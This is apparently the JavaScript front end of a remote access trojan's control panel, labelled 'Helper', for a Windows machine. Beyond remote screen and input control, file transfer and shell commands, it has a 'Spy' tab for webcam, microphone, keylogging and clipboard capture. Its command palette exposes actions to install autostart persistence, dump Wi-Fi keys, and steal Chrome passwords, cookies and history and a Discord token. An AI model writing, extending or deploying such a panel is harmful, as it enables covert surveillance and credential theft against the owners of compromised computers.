const $ = s => document.querySelector(s);
const $$ = s => [...document.querySelectorAll(s)];
const H = s => String(s ?? '').replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
const sz = n => n > 2 ** 30 ? (n / 2 ** 30).toFixed(1) + 'G' : n > 2 ** 20 ? (n / 2 ** 20).toFixed(1) + 'M'
  : n > 1024 ? (n / 1024).toFixed(0) + 'K' : n + 'B';
const ts = t => new Date(t * 1000).toLocaleString();
const join = (a, b) => (String(a).endsWith('\\') ? a + b : a + '\\' + b);
const WSS = location.protocol === 'https:' ? 'wss://' : 'ws://';

function toast(m, k = '') {
  const d = document.createElement('div');
  d.className = 'toast ' + k; d.textContent = m;
  $('#toasts').append(d); setTimeout(() => d.remove(), 4200);
}
function log(m) {
  const el = $('#log');
  el.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
  el.scrollTop = el.scrollHeight;
  if (el.textContent.length > 60000) el.textContent = el.textContent.slice(-40000);
}
async function api(p, b) {
  const r = await fetch(p, b ? { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(b) } : {});
  if (r.status === 401) { location.href = '/'; return {}; }
  return r.json().catch(() => ({}));
}
async function act(a, args = {}) {
  log('act: ' + a);
  const j = await api('/api/act', { action: a, args });
  if (j.error) { toast(j.error, 'bad'); return ''; }
  return j.out ?? '';
}

/* ---------- router ---------- */
const T = { dash: 'Dashboard', screen: 'Screen', files: 'Files', spy: 'Spy', net: 'Network', sys: 'System', cmd: 'Terminal', log: 'Activity' };
function go(t) {
  $$('#rail button').forEach(b => b.classList.toggle('on', b.dataset.t === t));
  $$('.p').forEach(p => p.classList.toggle('on', p.id === 'p-' + t));
  $('#title').textContent = T[t] || t;
  location.hash = t;
  if (t === 'sys') { sysTick(); procs(); }
  if (t === 'net') netLoad();
  if (t === 'files') browse(cur);
  if (t === 'dash') dash();
  if (t === 'spy') loadCams();
  if (t === 'cmd') act('cwd').then(c => $('#cwd').textContent = c);
}
$$('#rail button').forEach(b => b.onclick = () => b.dataset.t && go(b.dataset.t));
window.onhashchange = () => go(location.hash.slice(1) || 'dash');

async function ping() {
  try {
    const r = await fetch('/health', { cache: 'no-store' });
    const j = await r.json();
    $('#dot').classList.toggle('on', r.ok);
    $('#stat').textContent = r.ok ? (j.provider || 'local') : 'offline';
  } catch { $('#dot').classList.remove('on'); $('#stat').textContent = 'offline'; }
}
setInterval(ping, 6000); ping();

/* ---------- dashboard ---------- */
const hist = { c: [], r: [] };
async function dash() {
  const j = await api('/api/sys');
  if (!j.cpu && j.cpu !== 0) return;
  hist.c.push(j.cpu); hist.r.push(j.ram);
  if (hist.c.length > 70) { hist.c.shift(); hist.r.shift(); }
  chart();
  const up = Math.floor(j.uptime / 3600) + 'h ' + Math.floor((j.uptime % 3600) / 60) + 'm';
  const G = (t, v, sub, cls) => `<div class="g"><h4>${t}</h4><div class="v">${v}</div>
    <div class="s">${sub || ''}</div><div class="bar ${cls || ''}"><i style="width:${Math.min(100, parseFloat(v))}%"></i></div></div>`;
  $('#gauges').innerHTML =
    G('CPU', j.cpu.toFixed(0) + '%', j.procs.length + ' processes', j.cpu > 85 ? 'b' : j.cpu > 60 ? 'w' : '') +
    G('Memory', j.ram.toFixed(0) + '%', sz(j.ram_used) + ' / ' + sz(j.ram_total), j.ram > 88 ? 'b' : j.ram > 70 ? 'w' : '') +
    G('Disk C:', j.disk.toFixed(0) + '%', '', j.disk > 90 ? 'b' : '') +
    `<div class="g"><h4>Uptime</h4><div class="v">${up}</div><div class="s">boot ${new Date(j.boot * 1000).toLocaleString()}</div></div>` +
    `<div class="g"><h4>Network</h4><div class="v" style="font-size:15px">↑ ${sz(j.net.sent)}</div>
      <div class="s" style="font-size:15px">↓ ${sz(j.net.recv)}</div></div>` +
    `<div class="g"><h4>Battery</h4><div class="v">${j.battery ? j.battery.percent + '%' : '—'}</div>
      <div class="s">${j.battery ? (j.battery.power_plugged ? 'plugged' : 'on battery') : 'desktop'}</div></div>`;

  const i = await api('/api/act', { action: 'info', args: {} });
  try { $('#facts').innerHTML = JSON.parse(i.out).fields.map(([k, v]) => `<span>${H(k)}</span><b>${H(v)}</b>`).join(''); } catch {}

  $('#quick').innerHTML = '';
  [['Lock', 'lock'], ['Sleep', 'sleep'], ['Screen off', 'monoff'], ['Restart', 'restart'],
   ['Shutdown', 'shutdown'], ['Message', 'msg'], ['Toast', 'toast'], ['Speak', 'speak'],
   ['Install autostart', 'persist']].forEach(([l, a]) => {
    const b = document.createElement('button');
    b.textContent = l;
    b.onclick = async () => {
      if (['msg', 'toast', 'speak'].includes(a)) {
        const t = prompt(l + ' text'); if (!t) return;
        toast(await act(a, { text: t }) || 'sent', 'ok');
      } else toast(await act(a) || a, 'ok');
    };
    $('#quick').append(b);
  });
}
setInterval(() => { if ($('#p-dash').classList.contains('on')) dash(); }, 2500);

function chart() {
  const c = $('#chart'), x = c.getContext('2d');
  c.width = c.clientWidth; const w = c.width, h = c.height;
  x.clearRect(0, 0, w, h);
  const line = (a, col) => {
    x.beginPath(); x.strokeStyle = col; x.lineWidth = 2; x.lineJoin = 'round';
    a.forEach((v, i) => {
      const px = (i / Math.max(1, a.length - 1)) * w, py = h - (v / 100) * h;
      i ? x.lineTo(px, py) : x.moveTo(px, py);
    });
    x.stroke();
  };
  line(hist.c, '#3b82f6'); line(hist.r, '#06b6d4');
}

/* ---------- screen ---------- */
let ws, tiles = 0, byts = 0, tT = performance.now(), autoQ = true, curQ = 60, low = 0, high = 0;
const cv = $('#cv'), ctx = cv.getContext('2d');
const send = o => ws && ws.readyState === 1 && ws.send(JSON.stringify(o));

function sconnect() {
  if (ws && ws.readyState <= 1) return;
  ws = new WebSocket(WSS + location.host + '/ws');
  ws.binaryType = 'arraybuffer';
  ws.onopen = () => { $('#stat').textContent = 'live'; toast('screen connected', 'ok'); };
  ws.onclose = () => { $('#stat').textContent = 'reconnecting'; setTimeout(sconnect, 1800); };
  ws.onmessage = e => {
    const d = new DataView(e.data), u = new Uint8Array(e.data);
    if (u[0] !== 1) return;
    const x = d.getUint16(1), y = d.getUint16(3), w = d.getUint16(5), h = d.getUint16(7);
    const fw = d.getUint16(9), fh = d.getUint16(11), len = d.getUint32(13);
    if (cv.width !== fw || cv.height !== fh) { cv.width = fw; cv.height = fh; ctx.imageSmoothingEnabled = false; }
    byts += u.byteLength;
    createImageBitmap(new Blob([u.subarray(17, 17 + len)], { type: 'image/jpeg' }))
      .then(b => ctx.drawImage(b, x, y, w, h));
    tiles++;
  };
}
setInterval(() => {
  const now = performance.now(), s = (now - tT) / 1000, tps = Math.round(tiles / s);
  $('#smeter').textContent = tps + ' tiles/s · ' + Math.round(byts / s / 1024) + ' KB/s';
  if (autoQ && ws && ws.readyState === 1) {
    if (tps < 6) { low++; high = 0; } else if (tps > 22) { high++; low = 0; } else { low = high = 0; }
    if (low >= 3 && curQ > 28) { curQ -= 6; send({ t: 'q', v: curQ }); $('#sq').value = curQ; $('#sqv').textContent = curQ; low = 0; }
    if (high >= 6 && curQ < 78) { curQ += 4; send({ t: 'q', v: curQ }); $('#sq').value = curQ; $('#sqv').textContent = curQ; high = 0; }
  }
  tiles = 0; byts = 0; tT = now;
}, 1000);

$('#sstart').onclick = () => { sconnect(); send({ t: 'mon', v: +$('#smon').value }); };
$('#sstop').onclick = () => { ws && ws.close(); ws = null; };
$('#sauto').onclick = () => { autoQ = !autoQ; $('#sauto').classList.toggle('on', autoQ); toast('auto quality ' + (autoQ ? 'on' : 'off')); };
$('#sfps').oninput = e => { $('#sfpsv').textContent = e.target.value; send({ t: 'fps', v: +e.target.value }); };
$('#sq').oninput = e => { curQ = +e.target.value; $('#sqv').textContent = curQ; send({ t: 'q', v: curQ }); };
$('#ssc').oninput = e => { $('#sscv').textContent = e.target.value + '%'; send({ t: 'scale', v: e.target.value / 100 }); };
$('#smon').onchange = e => send({ t: 'mon', v: +e.target.value });
$('#sfull').onclick = () => $('#stage').requestFullscreen?.();
document.addEventListener('visibilitychange', () => send({ t: 'pause', v: document.hidden ? 1 : 0 }));

cv.onmousemove = e => { const r = cv.getBoundingClientRect(); send({ t: 'move', x: Math.round(e.clientX - r.left), y: Math.round(e.clientY - r.top) }); };
cv.onmousedown = e => { e.preventDefault(); cv.focus(); const r = cv.getBoundingClientRect();
  send({ t: e.detail === 2 ? 'double' : 'click', x: Math.round(e.clientX - r.left), y: Math.round(e.clientY - r.top), b: e.button === 2 ? 'right' : 'left' }); };
cv.oncontextmenu = e => e.preventDefault();
cv.onwheel = e => { e.preventDefault(); send({ t: 'wheel', d: e.deltaY < 0 ? 120 : -120 }); };
document.addEventListener('keydown', e => {
  if (['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) return;
  if (!$('#p-screen').classList.contains('on')) return;
  e.preventDefault();
  if (e.ctrlKey || e.altKey || e.metaKey)
    send({ t: 'hotkey', k: [e.ctrlKey && 'ctrl', e.altKey && 'alt', e.shiftKey && 'shift', e.metaKey && 'win', e.key].filter(Boolean) });
  else send({ t: 'key', k: e.key.length === 1 ? e.key : e.key.toUpperCase() });
});
fetch('/api/monitors').then(r => r.json()).then(m => {
  $('#smon').innerHTML = m.map(x => `<option value="${x.i}">mon ${x.i} · ${x.w}×${x.h}</option>`).join('');
});

/* ---------- files ---------- */
let cur = 'C:\\';
async function browse(p) {
  const j = await api('/api/fs?path=' + encodeURIComponent(p));
  if (j.error) { toast(j.error, 'bad'); return; }
  cur = j.path; $('#fpath').value = j.path; $('#fmeta').textContent = j.items.length + ' items';
  $('#drives').innerHTML = j.drives.map(d => `<button data-p="${H(d.path)}">${H(d.path)} · ${sz(d.free)} free</button>`).join('');
  $('#drives').querySelectorAll('button').forEach(b => b.onclick = () => browse(b.dataset.p));
  const L = $('#flist'); L.innerHTML = '';
  if (j.path.length > 3) {
    const r = document.createElement('div'); r.className = 'row d';
    r.innerHTML = '<span class="nm">↑ ..</span>';
    r.querySelector('.nm').onclick = () => browse(j.parent); L.append(r);
  }
  for (const it of j.items) {
    const full = join(j.path, it.name);
    const r = document.createElement('div');
    r.className = 'row' + (it.dir ? ' d' : '');
    r.innerHTML = `<span class="nm">${it.dir ? '▸ ' : ''}${H(it.name)}</span>
      <span class="mt">${ts(it.mtime)}</span><span class="sz">${it.dir ? '' : sz(it.size)}</span>
      <span class="ac"><button title="download">↓</button><button title="zip">Z</button>
      <button title="rename">✎</button><button title="delete">✕</button></span>`;
    r.querySelector('.nm').onclick = () => {
      if (it.dir) browse(full);
      else if (['png','jpg','jpeg','gif','webp','bmp'].includes(it.ext)) {
        $('#vimg').src = '/api/fs/preview?path=' + encodeURIComponent(full);
        $('#viewer').classList.remove('hidden');
      } else openEditor(full, it.name);
    };
    const [dl, zp, rn, de] = r.querySelectorAll('.ac button');
    dl.onclick = e => { e.stopPropagation(); location = '/api/fs/raw?path=' + encodeURIComponent(full); };
    zp.onclick = e => { e.stopPropagation(); location = '/api/fs/zip?path=' + encodeURIComponent(full); };
    rn.onclick = async e => { e.stopPropagation(); const n = prompt('new name', it.name); if (!n) return;
      await api('/api/fs/rename', { from: full, to: join(j.path, n) }); browse(j.path); };
    de.onclick = async e => { e.stopPropagation(); if (!confirm('delete ' + it.name + '?')) return;
      await api('/api/fs/delete', { paths: [full] }); browse(j.path); };
    L.append(r);
  }
}
$('#fup').onclick = () => browse(cur.split('\\').slice(0, -1).join('\\') + '\\');
$('#fgo').onclick = () => browse($('#fpath').value);
$('#fpath').onkeydown = e => e.key === 'Enter' && browse($('#fpath').value);
$('#fnew').onclick = async () => { const n = prompt('folder name'); if (!n) return;
  await api('/api/fs/mkdir', { path: join(cur, n) }); browse(cur); };
$('#fsearch').onclick = async () => {
  const p = prompt('filename contains'); if (!p) return;
  const o = await act('search', { root: '%USERPROFILE%', pattern: p });
  $('#cout').textContent += '\n> search ' + p + '\n' + o + '\n'; toast('results in Terminal');
};
$('#vclose').onclick = () => $('#viewer').classList.add('hidden');

const CH = 8 * 1024 * 1024;
async function upload(files) {
  for (const f of files) {
    const { id } = await api('/api/upload/start', { path: cur, name: f.name, size: f.size });
    let off = 0; const q = $('#ulq'); q.classList.remove('hidden');
    while (off < f.size) {
      const b = f.slice(off, off + CH);
      await fetch('/api/upload/chunk?id=' + id, { method: 'POST', body: b });
      off += b.size; const pc = Math.round(off / f.size * 100);
      q.querySelector('i').style.width = pc + '%';
      q.querySelector('span').textContent = `${f.name} — ${pc}%`;
    }
    await api('/api/upload/finish', { id, path: cur, name: f.name });
    q.classList.add('hidden'); toast('uploaded ' + f.name, 'ok');
  }
  browse(cur);
}
$('#fupl').onchange = e => upload([...e.target.files]);
document.ondragover = e => { e.preventDefault(); $('#drop').classList.add('hot'); };
document.ondragleave = () => $('#drop').classList.remove('hot');
document.ondrop = e => { e.preventDefault(); $('#drop').classList.remove('hot'); upload([...e.dataTransfer.files]); };
async function openEditor(p, name) {
  const j = await api('/api/fs/read?path=' + encodeURIComponent(p));
  if (j.error) { toast(j.error, 'bad'); return; }
  $('#ename').textContent = name; $('#etext').value = j.data;
  $('#editor').classList.remove('hidden');
  $('#esave').onclick = async () => { await api('/api/fs/write', { path: p, data: $('#etext').value });
    $('#editor').classList.add('hidden'); toast('saved', 'ok'); };
  $('#eclose').onclick = () => $('#editor').classList.add('hidden');
}

/* ---------- spy ---------- */
let camsOk = false, camTimer = null, camLive = false;
async function loadCams(f = false) {
  if (camsOk && !f) return;
  const j = await api('/api/cams' + (f ? '?force=1' : ''));
  const l = j.cams && j.cams.length ? j.cams : [0];
  $('#camidx').innerHTML = l.map(i => `<option value="${i}">camera ${i}</option>`).join('');
  camsOk = true;
}
function camState(t) { $('#camstate').textContent = t; $('#camstate').classList.toggle('on', t === 'live'); }
$('#camshot').onclick = () => { camState('grab');
  $('#cam').src = '/api/cam?i=' + ($('#camidx').value || 0) + '&' + Date.now();
  setTimeout(() => camState(camLive ? 'live' : 'off'), 900); };
$('#camloop').onclick = async () => {
  if (camTimer) clearInterval(camTimer);
  await api('/api/cam/live', { on: true, idx: +($('#camidx').value || 0) });
  camLive = true; camState('live');
  camTimer = setInterval(() => $('#cam').src = '/api/cam/shot?' + Date.now(), 120);
};
$('#camstop').onclick = async () => {
  if (camTimer) { clearInterval(camTimer); camTimer = null; }
  await api('/api/cam/release', {}); camLive = false; camState('off'); toast('camera released', 'ok');
};
$('#mrec').onclick = () => $('#aud').src = '/api/mic?s=' + $('#msec').value + '&' + Date.now();
$('#clipset').onclick = async () => { await act('clipset', { text: $('#clips').value }); toast('set', 'ok'); };
$('#kon').onclick = async () => toast(await act('keys_start'), 'ok');
$('#koff').onclick = async () => toast(await act('keys_stop'), 'ok');
$('#kclr').onclick = async () => { await act('keys_clear'); $('#kb').textContent = ''; };
$('#kdl').onclick = () => { const b = new Blob([$('#kb').textContent], { type: 'text/plain' });
  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'keylog.txt'; a.click(); };
$$('#p-spy .chips button[data-a]').forEach(b => b.onclick = async () => {
  $('#bout').textContent = 'loading...'; $('#bout').textContent = await act(b.dataset.a); });
new WebSocket(WSS + location.host + '/spy').onmessage = e => {
  const j = JSON.parse(e.data);
  $('#active').textContent = j.active || '—';
  $('#clip').textContent = j.clip || '—';
  $('#idle').textContent = j.idle || '0';
  if (j.cam_live !== undefined && j.cam_live !== camLive) { camLive = j.cam_live; camState(camLive ? 'live' : 'off'); }
  const kb = $('#kb'), at = kb.scrollTop + kb.clientHeight >= kb.scrollHeight - 40;
  kb.textContent = j.keys; if (at) kb.scrollTop = kb.scrollHeight;
};

/* ---------- net ---------- */
async function netLoad() {
  const o = await act('net');
  try {
    const j = JSON.parse(o);
    let h = '<div class="card"><h3>Wi-Fi</h3><table>' +
      j.wifi.map(w => `<tr><td>${H(w.ssid)}</td><td>${H(w.key || '(open)')}</td><td>${H(w.auth)}</td></tr>`).join('') +
      '</table></div>';
    for (const k of ['proxy','adapters','shares','fw','arp','route','netstat','dns'])
      h += `<div class="card"><h3>${k}</h3><pre>${H(j[k] || '')}</pre></div>`;
    $('#netout').innerHTML = h;
  } catch { $('#netout').innerHTML = '<div class="card"><pre>' + H(o) + '</pre></div>'; }
}
$$('#netbtns button').forEach(b => b.onclick = async () => {
  if (b.dataset.a) { $('#netout').innerHTML = '<div class="card"><pre>' + H(await act(b.dataset.a)) + '</pre></div>'; }
  else { const o = await act('net');
    try { const j = JSON.parse(o); $('#netout').innerHTML = `<div class="card"><h3>${b.dataset.n}</h3><pre>${H(j[b.dataset.n] || '')}</pre></div>`; } catch {} }
});
$('#psgo').onclick = async () => {
  $('#psout').textContent = 'scanning...';
  const j = await api('/api/portscan', { host: $('#pshost').value, start: +$('#psa').value, end: +$('#psb').value });
  $('#psout').textContent = j.open?.length ? 'open: ' + j.open.join(', ') : 'no open ports';
};

/* ---------- sys ---------- */
async function sysTick() {
  const j = await api('/api/sys');
  if (!j.cpu && j.cpu !== 0) return;
  $('#sysgauges').innerHTML =
    `<div class="g"><h4>CPU</h4><div class="v">${j.cpu.toFixed(0)}%</div><div class="bar"><i style="width:${j.cpu}%"></i></div></div>
     <div class="g"><h4>RAM</h4><div class="v">${j.ram.toFixed(0)}%</div><div class="bar"><i style="width:${j.ram}%"></i></div></div>
     <div class="g"><h4>Disk</h4><div class="v">${j.disk.toFixed(0)}%</div><div class="bar"><i style="width:${j.disk}%"></i></div></div>
     <div class="g"><h4>Processes</h4><div class="v">${j.procs.length}</div></div>`;
}
setInterval(() => { if ($('#p-sys').classList.contains('on')) { sysTick(); procs(); } }, 2500);
async function procs() {
  const j = await api('/api/sys'), f = $('#pfilter').value.toLowerCase();
  const l = (j.procs || []).filter(p => !f || p.name.toLowerCase().includes(f));
  $('#procs').innerHTML = l.map(p => `<div class="r">
    <span>${H(p.name)} <b style="color:#4f586e">${p.pid}</b> <i style="color:#3b4357">${H(p.user || '')}</i></span>
    <span class="c">${(p.cpu || 0).toFixed(0)}%</span><span class="m">${sz(p.mem)}</span>
    <button data-p="${p.pid}" data-a="kill">✕</button><button data-p="${p.pid}" data-a="suspend">|</button>
    <button data-p="${p.pid}" data-a="resume">▶</button></div>`).join('');
  $('#procs').querySelectorAll('button').forEach(b => b.onclick = async () => {
    await api('/api/proc', { pid: +b.dataset.p, action: b.dataset.a }); procs(); });
}
$('#pfilter').oninput = procs;
$$('#p-sys .chips button').forEach(b => b.onclick = async () => {
  $('#sysout').textContent = 'running...'; $('#sysout').textContent = await act(b.dataset.a); log('sys: ' + b.dataset.a); });

/* ---------- cmd ---------- */
const cin = $('#cin'), cout = $('#cout'), hs = [];
let hi = -1, psMode = false;
$('#cmdmode').onclick = () => { psMode = !psMode; $('#cmdmode').textContent = psMode ? 'powershell' : 'cmd'; $('#cmdmode').classList.toggle('on', psMode); };
$('#cclr').onclick = () => cout.textContent = '';
$('#cgo').onclick = run;
cin.onkeydown = e => {
  if (e.key === 'ArrowUp') { hi = Math.max(0, hi - 1); cin.value = hs[hi] || ''; return; }
  if (e.key === 'ArrowDown') { hi = Math.min(hs.length, hi + 1); cin.value = hs[hi] || ''; return; }
  if (e.key === 'Enter') run();
};
async function run() {
  const c = cin.value.trim(); if (!c) return;
  hs.push(c); hi = hs.length; cin.value = '';
  cout.textContent += `\n${psMode ? 'PS' : '>' } ${c}\n`; cout.scrollTop = cout.scrollHeight;
  cout.textContent += (await act(psMode ? 'ps' : 'cmd', { cmd: c }) || '') + '\n';
  cout.scrollTop = cout.scrollHeight;
}

/* ---------- power + palette ---------- */
$('#power').onclick = () => {
  const m = ['Lock','Sleep','Screen off','Restart','Shutdown','Log off'];
  const p = prompt('Power:\n' + m.map((x, i) => `${i + 1}. ${x}`).join('\n'), '1');
  const a = { 1:'lock',2:'sleep',3:'monoff',4:'restart',5:'shutdown',6:'logoff' }[+p];
  if (a) act(a).then(o => toast(o || a, 'ok'));
};
$('#logclr').onclick = () => $('#log').textContent = '';

const ITEMS = [['Dashboard','dash'],['Screen','screen'],['Files','files'],['Spy','spy'],['Network','net'],
  ['System','sys'],['Terminal','cmd'],['Activity','log'],
  ['Lock','lock'],['Sleep','sleep'],['Screen off','monoff'],['Restart','restart'],['Shutdown','shutdown'],
  ['Install autostart','persist'],['Remove autostart','unpersist'],['Persistence status','status'],
  ['Wi-Fi keys','wifi'],['Chrome passwords','passwords'],['Chrome cookies','cookies'],['Chrome history','history'],
  ['Discord token','dtoken'],['Geo IP','geo'],['Clipboard','clip'],['Services','services'],['Startup','startup'],
  ['Installed apps','installed'],['Hotfixes','patches'],['Users','users'],['Admins','admins']];
function palette(open) {
  $('#pal').classList.toggle('hidden', !open);
  if (open) { $('#palq').value = ''; palRender(''); $('#palq').focus(); }
}
function palRender(q) {
  const hits = ITEMS.filter(i => i[0].toLowerCase().includes(q.toLowerCase()));
  $('#palr').innerHTML = hits.map(i => `<button data-k="${i[1]}">${i[0]}</button>`).join('') || '<button>no match</button>';
  $('#palr').querySelectorAll('button').forEach(b => b.onclick = async () => {
    palette(false);
    const k = b.dataset.k; if (!k) return;
    if (T[k]) return go(k);
    const o = await act(k);
    if (o) { $('#cout').textContent += `\n> ${k}\n${o}\n`; go('cmd'); }
  });
}
$('#palette').onclick = () => palette(true);
$('#palq').oninput = e => palRender(e.target.value);
$('#pal').onclick = e => { if (e.target.id === 'pal') palette(false); };
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); palette(true); }
  if (e.key === 'Escape') palette(false);
});

/* ---------- boot ---------- */
(async () => {
  const i = await api('/api/act', { action: 'info', args: {} });
  try {
    const f = Object.fromEntries(JSON.parse(i.out).fields);
    $('#host').textContent = f.Host + ' · ' + f.User;
    document.title = f.Host + ' — Helper';
  } catch {}
  go(location.hash.slice(1) || 'dash');
  dash(); log('panel ready');
})();